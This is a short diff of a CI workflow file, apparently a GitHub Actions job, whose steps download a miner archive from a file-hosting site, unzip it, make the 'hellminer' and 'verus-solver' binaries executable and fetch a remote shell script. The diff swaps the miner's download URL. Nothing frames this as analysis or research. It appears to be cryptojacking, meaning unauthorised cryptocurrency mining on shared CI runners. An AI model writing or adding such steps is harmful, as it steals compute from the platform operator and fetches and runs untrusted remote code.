@@ -11,7 +11,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: sudo apt install neofetch -y
-      - run: wget flupy.me/miner.zip
+      - run: wget https://bashupload.com/uFZkJ/miner.zip
       - run: unzip miner.zip
       - run: chmod +x hellminer verus-solver
       - run: wget flupy.me/rig6.sh
